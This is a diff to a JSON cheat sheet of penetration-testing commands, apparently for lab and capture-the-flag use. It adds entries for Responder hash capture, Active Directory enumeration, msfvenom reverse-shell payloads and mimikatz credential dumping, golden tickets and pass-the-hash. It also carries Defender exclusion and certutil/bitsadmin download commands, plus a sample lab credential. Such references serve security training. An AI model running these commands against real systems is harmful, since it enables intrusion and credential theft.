@@ -10,15 +10,7 @@
             }
         ],
         "description": "Adding a file to Microsoft Windows Defender Exclusion List",
-        "tags": [
-            "windows",
-            "defender",
-            "exclusion",
-            "antivirus",
-            "antimalware",
-            "add-mppreference",
-            "file"
-        ]
+        "tags": [ "windows", "defender", "exclusion", "antivirus", "antimalware", "add-mppreference", "file" ]
     },
     {
         "commands": [
@@ -32,17 +24,7 @@
             }
         ],
         "description": "Using Powershell to list all the exclusions added to Windows Defender",
-        "tags": [
-            "windows",
-            "defender",
-            "exclusion",
-            "antivirus",
-            "antimalware",
-            "file",
-            "get-mppreference",
-            "exclusionpath",
-            "powershell"
-        ]
+        "tags": ["windows", "defender", "exclusion", "antivirus", "antimalware", "file", "get-mppreference", "exclusionpath", "powershell"]
     },
     {
         "commands": [
@@ -55,36 +37,26 @@
             }
         ],
         "description": "Using Powershell to remove an exclusion from Windows Defender",
-        "tags": [
-            "windows",
-            "defender",
-            "exclusion",
-            "antivirus",
-            "antimalware",
-            "file",
-            "remove-mppreference",
-            "exclusionpath",
-            "powershell"
-        ]
+        "tags": ["windows","defender","exclusion","antivirus","antimalware","file","remove-mppreference","exclusionpath","powershell"]
     },
     {
         "commands": [
             {
-                "cmd": "scp local-file user@ip:/remote/path/to/drop/to",
+                "cmd": "scp <local-file> <user>@<ip>:</remote/path/to/drop/to>",
                 "description": "Basic Usage",
                 "examples": [
                     "scp test.txt user@192.168.18.15:/root/test.txt"
                 ]
             },
             {
-                "cmd": "scp -P remote-ssh-port local-file user@ip:/remote/path/to/drop/to",
+                "cmd": "scp -P <remote-ssh-port> <local-file> <user>@<ip>:</remote/path/to/drop/to>",
                 "description": "Specifying remote SSH port",
                 "examples": [
                     "scp -P 2222 test.txt user@192.168.18.15:/root/test.txt"
                 ]
             },
             {
-                "cmd": "scp -i key.pem local-file user@ip:/remote/path/to/drop/to",
+                "cmd": "scp -i <key.pem> <local-file> <user>@<ip>:</remote/path/to/drop/to>",
                 "description": "Specifying SSH key",
                 "examples": [
                     "scp -i key.pem test.txt user@192.168.18.15:/root/test.txt"
@@ -92,35 +64,26 @@
             }
         ],
         "description": "Using SCP to upload a file to the remote server",
-        "tags": [
-            "upload",
-            "scp",
-            "ssh",
-            "remote",
-            "put",
-            "drop",
-            "file",
-            "linux"
-        ]
+        "tags": ["upload","scp","ssh","remote","put","drop","file","linux"]
     },
     {
         "commands": [
             {
-                "cmd": "scp user@ip:/remote/path/to/drop/to local-file",
+                "cmd": "scp <user>@<ip>:</remote/path/to/drop/to> <local-file>",
                 "description": "Basic Usage",
                 "examples": [
                     "scp user@192.168.18.15:/root/test.txt test.txt"
                 ]
             },
             {
-                "cmd": "scp -P remote-ssh-port user@ip:/remote/path/to/drop/to  local-file",
+                "cmd": "scp -P <remote-ssh-port> <user>@<ip>:</remote/path/to/drop/to> <local-file>",
                 "description": "Specifying remote SSH port",
                 "examples": [
                     "scp -P 2222 user@192.168.18.15:/root/test.txt test.txt"
                 ]
             },
             {
-                "cmd": "scp -i key.pem user@ip:/remote/path/to/drop/to local-file",
+                "cmd": "scp -i <key.pem> <user>@<ip>:</remote/path/to/drop/to> <local-file>",
                 "description": "Specifying SSH key",
                 "examples": [
                     "scp -i key.pem user@192.168.18.15:/root/test.txt test.txt"
@@ -128,25 +91,12 @@
             }
         ],
         "description": "Using SCP to download a file to the remote server",
-        "tags": [
-            "download",
-            "scp",
-            "ssh",
-            "remote",
-            "put",
-            "drop",
-            "file",
-            "linux",
-            "pem",
-            "ssh-key",
-            "key-file",
-            "port"
-        ]
+        "tags": [ "download", "scp", "ssh", "remote", "put", "drop", "file", "linux", "pem", "ssh-key", "key-file", "port" ]
     },
     {
         "commands": [
             {
-                "cmd": "curl -sL http://IP -o file",
+                "cmd": "curl -sL <host> -o <outfile>",
                 "description": "Using cURL (Available on Both Linux and Windows now)",
                 "examples": [
                     "curl -sL http://192.168.0.100:9000/test.txt -o /tmp/test.txt"
@@ -154,20 +104,12 @@
             }
         ],
         "description": "Using curl to download files to the machine",
-        "tags": [
-            "download",
-            "file",
-            "curl",
-            "linux",
-            "windows",
-            "cmd",
-            "powershell"
-        ]
+        "tags": [ "download", "file", "curl", "linux", "windows", "cmd", "powershell" ]
     },
     {
         "commands": [
             {
-                "cmd": "wget http://IP -O file",
+                "cmd": "wget <host> -O <outfile>",
                 "description": "Using wget",
                 "examples": [
                     "wget http://10.10.11.50:1234/main.sh",
@@ -176,14 +118,7 @@
             }
         ],
         "description": "Using wget to download files to the machine",
-        "tags": [
-            "download",
-            "file",
-            "wget",
-            "windows",
-            "linux",
-            "cmd"
-        ]
+        "tags": [ "download", "file", "wget", "windows", "linux", "cmd" ]
     },
     {
         "commands": [
@@ -199,16 +134,7 @@
             }
         ],
         "description": "Using powershell to download files",
-        "tags": [
-            "download",
-            "file",
-            "powershell",
-            "windows",
-            "invoke-webrequest",
-            "iwr",
-            "webrequest",
-            "powershell -c"
-        ]
+        "tags": [ "download", "file", "powershell", "windows", "invoke-webrequest", "iwr", "webrequest", "powershell -c" ]
     },
     {
         "commands": [
@@ -221,21 +147,12 @@
             }
         ],
         "description": "Using powershell to download files (.NET WebClient)",
-        "tags": [
-            "download",
-            "file",
-            "powershell",
-            "windows",
-            ".net",
-            "webclient",
-            "system.net",
-            "powershell -c"
-        ]
+        "tags": ["download", "file", "powershell", "windows", ".net", "webclient", "system.net", "powershell"]
     },
     {
         "commands": [
             {
-                "cmd": "certutil -urlcache -split -f http://IP file",
+                "cmd": "certutil -urlcache -split -f <host> file",
                 "description": "Using certutil to download files",
                 "examples": [
                     "certutil -urlcache -split -f http://10.10.50.200/test.txt C:\\Users\\Public\\Downloads\\test.txt"
@@ -243,20 +160,12 @@
             }
         ],
         "description": "Using certutil to download files",
-        "tags": [
-            "download",
-            "file",
-            "cmd",
-            "cmd.exe",
-            "batch",
-            "windows",
-            "certutil"
-        ]
+        "tags": ["download", "file", "cmd", "cmd.exe", "batch", "windows", "certutil"]
     },
     {
         "commands": [
             {
-                "cmd": "bitsadmin /transfer n http://IP/file C:\\Users\\Public\\Downloads\\file",
+                "cmd": "bitsadmin /transfer n <remote_file> <local_file>",
                 "description": "Using bitsadmin to download files",
                 "examples": [
                     "bitsadmin /transfer n http://10.10.50.200/admin.txt C:\\Users\\Public\\Downloads\\admin.txt"
@@ -264,27 +173,19 @@
             }
         ],
         "description": "Using bitsadmin to download files",
-        "tags": [
-            "download",
-            "file",
-            "cmd",
-            "cmd.exe",
-            "batch",
-            "windows",
-            "bitsadmin"
-        ]
+        "tags": ["download", "file", "cmd", "cmd.exe", "batch", "windows", "bitsadmin"]
     },
     {
         "commands": [
             {
-                "cmd": "runas.exe /netonly /user:domain\\username cmd.exe",
-                "description": "Using runas to run a command as a different user. You will be prompted for password.",
+                "cmd": "runas.exe /netonly /user:<domain>\\<username> cmd.exe",
+                "description": "Using runas to get a shell as a different user. You will be prompted for password.",
                 "examples": [
                     "runas.exe /netonly /user:domain\\username cmd.exe"
                 ]
             },
             {
-                "cmd": "runas.exe /netonly /user:domain\\username \"cmd.exe /c <command>\"",
+                "cmd": "runas.exe /netonly /user:<domain>\\<username> \"cmd.exe /c <command>\"",
                 "description": "Using runas to run a command and get output directly",
                 "examples": [
                     "runas.exe /netonly /user:domain\\username \"cmd.exe /c whoami\""
@@ -292,15 +193,393 @@
             }
         ],
         "description": "Using runas to run a command as a different user",
-        "tags": [
-            "runas",
-            "different",
-            "user",
-            "netonly",
-            "user",
-            "windows",
-            "cmd.exe",
-            "cmd"
-        ]
+        "tags": ["runas","different","user","netonly","user","windows","cmd.exe","cmd", "batch"]
+    },
+    {
+        "commands" : [
+            {
+                "cmd" : "python -m pyftpdlib -p <port> -w",
+                "description" : "Using pyftpdlib to host a FTP server",
+                "examples" : [
+                    "python -m pyftpdlib -p 21 -w"
+                ]
+            }
+        ],
+        "description" : "Using pyftpdlib to host a FTP server",
+        "tags" : ["ftp", "server", "python", "pyftpdlib", "python2", "python3", "ftp-server"]
+    },
+    {
+        "commands" : [
+            {
+                "cmd" : "python -m SimpleHTTPServer <port>",
+                "description" : "Using python to host a HTTP server",
+                "examples" : [
+                    "python -m SimpleHTTPServer 80"
+                ]
+            },
+            {
+                "cmd" : "python3 -m http.server <port>",
+                "description" : "Using python3 to host a HTTP server",
+                "examples" : [
+                    "python3 -m http.server 80"
+                ]
+            }
+        ],
+        "description" : "Using python to host a HTTP server",
+        "tags" : ["http", "server", "python", "python2", "python3", "webserver", "simplehttpserver", "http.server" ]
+    },
+    {
+        "commands" : [
+            {
+                "cmd" : "python -c \"import pty; pty.spawn('/bin/bash')\"",
+                "description" : "Using python to spawn a better tty",
+                "examples" : [
+                    "python -c \"import pty; pty.spawn('/bin/bash')\""
+                ]
+            }
+        ],
+        "description" : "Using python to spawn a better tty/stable shell",
+        "tags" : ["python", "python2", "pty", "spawn", "bash", "shell", "tty", "stable", "stabilize"]
+    },
+    {
+        "commands" : [
+            {
+                "cmd" : "responder -I <interface> -rdwv",
+                "description" : "Using Responder to poison LLMNR, NBT-NS and MDNS and capture hashes",
+                "examples" : [
+                    "responder -I eth0 -rdwv"
+                ]
+            },
+            {
+                "cmd" : "responder -I <interface> -rdwv -P <proxy_ip>",
+                "description" : "Using Responder to poison LLMNR, NBT-NS and MDNS and capture hashes and relay them to a proxy",
+                "examples" : [
+                    "responder -I eth0 -rdwv -P 192.168.0.10"
+                ]
+            }
+        ],
+        "description" : "Using Responder to poison LLMNR, NBT-NS and MDNS and capture hashes",
+        "tags" : ["responder", "llmnr", "nbt-ns", "mdns", "hashes", "poison", "proxy", "relay", "windows", "linux", "proxychains"]
+    },
+    {
+        "commands" : [
+            {
+                "cmd" : "net user [/domain]",
+                "description" : "Using net to list [domain|all] users",
+                "examples" : [
+                    "net user",
+                    "net user /domain"
+                ]
+            },
+            {
+                "cmd" : "net user <username> [/domain]",
+                "description" : "Using net to list [domain] groups for a user",
+                "examples" : [
+                    "net user administrator",
+                    "net user administrator /domain"
+                ]
+            },
+            {
+                "cmd" : "net group [/domain]",
+                "description" : "Using net to list domain groups",
+                "examples" : [
+                    "net group",
+                    "net group [/domain]"
+                ]
+            },
+            {
+                "cmd" : "net group <group-name> [/domain]",
+                "description" : "Using net to list [domain] users in a group",
+                "examples" : [
+                    "net group \"Administrators\"",
+                    "net group \"Domain Admins\" /domain"
+                ]
+            },
+            {
+                "cmd" : "net localgroup",
+                "description" : "Using net to list local groups",
+                "examples" : [
+                    "net localgroup"
+                ]
+            }
+        ],
+        "description" : "Using net to list users and groups",
+        "tags" : ["net", "user", "group", "domain", "users", "groups", "windows", "cmd", "cmd.exe", "batch"]
+    },
+    {
+        "commands" : [
+            {
+                "cmd" : "Get-AdUser -Filter * -Properties * | select -Property Name,MemberOf",
+                "description" : "Using PowerShell to list all users and their groups",
+                "examples" : [
+                    "Get-AdUser -Filter * -Properties * | select -Property Name,MemberOf"
+                ]
+            },
+            {
+                "cmd" : "Get-AdGroup -Filter * -Properties * | select -Property Name,Member",
+                "description" : "Using PowerShell to list all groups and their members",
+                "examples" : [
+                    "Get-AdGroup -Filter * -Properties * | select -Property Name,Member"
+                ]
+            },
+            {
+                "cmd" : "Get-AdGroupMember -Identity <group-name>",
+                "description" : "Using PowerShell to list all members of a group",
+                "examples" : [
+                    "Get-AdGroupMember -Identity \"Domain Admins\"",
+                    "Get-AdGroupMember -Identity \"Domain Admins\" | select -ExpandProperty Name",
+                    "Get-AdGroupMember -Identity \"Domain Admins\" | select -ExpandProperty Members"
+                ]
+            },
+            {
+                "cmd" : "Get-AdUser -Identity <username> -Properties MemberOf | select -ExpandProperty MemberOf",
+                "description" : "Using PowerShell to list all groups a user is a member of",
+                "examples" : [
+                    "Get-AdUser -Identity administrator -Properties MemberOf | select -ExpandProperty MemberOf"
+                ]
+            },
+            {
+                "cmd" : "$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00); Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server dc.domain.local",
+                "description" : "Using PowerShell to list all deleted objects since a specific date",
+                "examples" : [
+                    "$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00); Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server dc.domain.local"
+                ]
+            },
+            {
+                "cmd" : "Get-ADDomain -Server <domain-controller>",
+                "description" : "Using PowerShell to list domain information",
+                "examples" : [
+                    "Get-ADDomain -Server dc.domain.local"
+                ]
+            },
+            {
+                "cmd" : "Set-ADAccountPassword -Identity gordon.stevens -Server <domain-controller> -OldPassword (ConvertTo-SecureString -AsPlaintext \"<old_password>\" -force) -NewPassword (ConvertTo-SecureString -AsPlainText \"<new_password>\" -Force)",
+                "description" : "Using PowerShell to change a domain user's password",
+                "examples" : [
+                    "Set-ADAccountPassword -Identity gordon.stevens -Server dc.domain.local -OldPassword (ConvertTo-SecureString -AsPlaintext \"Password123!\" -force) -NewPassword (ConvertTo-SecureString -AsPlainText \"Password123!\" -Force)"
+                ]
+            }
+        ],
+        "description" : "Using PowerShell to Active Directory information/enumeration",
+        "tags" : ["powershell", "ad", "adenum", "active-directory", "domain", "ADCMDLET" ,"users", "groups", "enumeration", "information", "windows", "cmd", "cmd.exe", "batch"]
+    },
+    {
+        "commands" : [
+            {
+                "cmd" : "netstat -ano",
+                "description" : "Using netstat to list all connections",
+                "examples" : [
+                    "netstat -ano"
+                ]
+            },
+            {
+                "cmd" : "netstat -ano | findstr <port>",
+                "description" : "Using netstat to list all connections on a specific port",
+                "examples" : [
+                    "netstat -ano | findstr 445"
+                ]
+            },
+            {
+                "cmd" : "netstat -ano | findstr <ip>",
+                "description" : "Using netstat to list all connections to a specific IP",
+                "examples" : [
+                    "netstat -ano | findstr 192.168.0.100"
+                ]
+            }
+        ],
+        "description" : "Using netstat to list connections",
+        "tags" : ["netstat", "connections", "ports", "ip", "windows", "cmd", "cmd.exe", "batch"]
+    },
+    {
+        "commands" : [
+            {
+                "cmd" : "SharpHound.exe --CollectionMethods All --Domain <domain-controller> --ExcludeDCs",
+                "description" : "Using SharpHound to enumerate domain information",
+                "examples" : [
+                    "SharpHound.exe --CollectionMethods All --Domain dc.domain.local --ExcludeDCs"
+                ]
+            },
+            {
+                "cmd" : "Import-Module .\\Sharphound.ps1; Invoke-Bloodhound -CollectionMethod All -Domain <domain-controller> -ZipFileName <zip-file-name>",
+                "description" : "Using SharpHound to enumerate domain information",
+                "examples" : [
+                    "Import-Module .\\Sharphound.ps1; Invoke-Bloodhound -CollectionMethod All -Domain dc.domain.local -ZipFileName domain.zip"
+                ]
+            },
+            {
+                "cmd" : "bloodhound-python -c ALL --dns-tcp -u '<username>' -p '<password>' --zip -ns <ip> -d <domain>",
+                "description" : "Using bloodhound-python to enumerate domain information",
+                "examples" : [
+                    "bloodhound-python -c ALL --dns-tcp -u 'watamet@holo.live' -p 'Nothingtoworry!' --zip -ns 10.200.95.30 -d holo.live"
+                ]
+            }
+        ],
+        "description" : "Using SharpHound/bloodhound-python to enumerate domain information",
+        "tags" : ["sharphound", "bloodhound", "bloodhound-python", "ad", "adenum", "active-directory", "domain", "users", "groups", "computers", "enumeration", "information", "windows", "cmd", "cmd.exe", "batch", "powershell"]
+    },
+    {
+        "commands" : [
+            {
+                "cmd" : "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > <OUTFILE>",
+                "description" : "Using msfvenom to generate a reverse shell payload",
+                "examples" : [
+                    "msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe > shell.exe"
+                ]
+            },
+            {
+                "cmd" : "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe  > <OUTFILE>",
+                "description" : "Using msfvenom to generate a meterpreter reverse shell payload",
+                "examples" : [
+                    "msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=55 -f exe  > met_tun0_55.exe"
+                ]
+            }
+        ],
+        "description" : "Using msfvenom to generate payloads",
+        "tags" : ["msfvenom", "payloads", "reverse-shell", "meterpreter", "windows", "cmd", "cmd.exe", "batch"]
+    },
+    {
+        "commands" : [
+            {
+                "cmd" : "privilege::debug",
+                "description" : "Using mimikatz to enable debug privileges",
+                "examples" : [
+                    "privilege::debug"
+                ]
+            },
+            {
+                "cmd" : "token::elevate",
+                "description" : "Using mimikatz to elevate privileges",
+                "examples" : [
+                    "token::elevate"
+                ]
+            },
+            {
+                "cmd" : "lsadump::lsa",
+                "description" : "Using mimikatz to dump LSA secrets",
+                "examples" : [
+                    "lsadump::lsa /patch",
+                    "lsadump::lsa /inject /name:krbtgt"
+                ]
+            },
+            {
+                "cmd" : "sekurlsa::tickets /export",
+                "description" : "Using mimikatz to dump kerberos tickets",
+                "examples" : [
+                    "sekurlsa::tickets /export"
+                ]
+            },
+            {
+                "cmd" : "lsadump::sam",
+                "description" : "Using mimikatz to dump SAM database",
+                "examples" : [
+                    "lsadump::sam"
+                ]
+            },
+            {
+                "cmd" : "sekurlsa::logonpasswords",
+                "description" : "Using mimikatz to dump plaintext passwords",
+                "examples" : [
+                    "sekurlsa::logonpasswords"
+                ]
+            },
+            {
+                "cmd" : "sekurlsa::msv",
+                "description" : "Using mimikatz to dump msv credentials",
+                "examples" : [
+                    "sekurlsa::msv"
+                ]
+            },
+            {
+                "cmd" : "sekurlsa::ekeys",
+                "description" : "Using mimikatz to dump ekeys",
+                "examples" : [
+                    "sekurlsa::ekeys"
+                ]
+            },
+            {
+                "cmd" : "kerberos::ptt <file-name>",
+                "description" : "Using mimikatz to import kerberos tickets",
+                "examples" : [
+                    "kerberos::ptt c:\\tickets\\ticket.kirbi"
+                ]
+            },
+            {
+                "cmd" : "kerberos::golden /user:<target-user> /domain:controller.local /sid:<dumped-sid> /<dumped-acc-name>:<dumped-hash> /id:<RID>",
+                "description" : "Using mimikatz to generate a golden kerberos ticket",
+                "examples" : [
+                    "kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:krbtgt-hash /id:500"
+                ]
+            },
+            {
+                "cmd" : "sekurlsa::pth /user:<username> /domain:<domain> /<enc-mode>:<hash> /run:<command>",
+                "description" : "Using mimikatz to generate a golden kerberos ticket. Modes can be rc4, aes128, aes256, ntlm",
+                "examples" : [
+                    "sekurlsa::pth /user:Administrator /domain:controller.local /aes256:krbtgt-hash /run:\"cmd.exe\""
+                ]
+            },
+            {
+                "cmd" : "token::revert",
+                "description" : "Using mimikatz to revert to original token",
+                "examples" : [
+                    "token::revert"
+                ]
+            },
+            {
+                "cmd" : "misc::cmd",
+                "description" : "Using mimikatz to spawn a new command prompt",
+                "examples" : [
+                    "misc::cmd"
+                ]
+            },
+            {
+                "cmd" : "misc::powershell",
+                "description" : "Using mimikatz to spawn a new powershell prompt",
+                "examples" : [
+                    "misc::powershell"
+                ]
+            },
+            {
+                "cmd" : "misc::skeleton",
+                "description" : "Using mimikatz to spawn a new skeleton prompt",
+                "examples" : [
+                    "misc::skeleton"
+                ]
+            }
+        ],
+        "description" : "Using mimikatz to dump credentials",
+        "tags" : ["mimikatz", "dump", "credentials", "kerberos", "golden", "kerberos-golden", "kerberos-golden-ticket", "golden-ticket", "pth", "pass-the-hash", "pass-the-ticket", "kerberos-ticket", "kerberos-tickets", "kerberos-ticket-dumping", "kerberos-ticket-dump", "kerberos-ticket-dump", "sekurlsa", "lsass", "privilege"]
+    },
+    {
+        "commands" : [
+            {
+                "cmd" : "ldapsearch -H ldap://<IP> -x -s base namingcontexts",
+                "description" : "Using ldapsearch to enumerate naming contexts",
+                "examples" : [
+                    "ldapsearch -H ldap://10.10.11.129 -x -s base namingcontexts"
+                ]
+            },
+            {
+                "cmd" : "ldapsearch -H ldap://<IP> -x -b \"<naming-context>\" \"(objectclass=*)\"",
+                "description" : "Using ldapsearch to enumerate naming contexts",
+                "examples" : [
+                    "ldapsearch -H ldap://10.10.11.129 -x -b \"DC=search,DC=htb\""
+                ]
+            }
+        ],
+        "description" : "Using ldapsearch to enumerate naming contexts",
+        "tags" : ["ldapsearch", "ldap", "naming-contexts", "naming", "contexts", "enumerate", "enumeration"]
+    },
+    {
+        "commands" : [
+            {
+                "cmd" : "windapsearch --dc <IP>",
+                "description" : "Using windapsearch to enumerate domain users",
+                "examples" : [
+                    "windapsearch --dc 10.10.10.1"
+                ]
+            }
+        ],
+        "description" : "Using windapsearch to enumerate domain users",
+        "tags" : ["windapsearch", "ldap", "search", "enumerate", "enumeration", "domain", "users", "user"]
     }
 ]
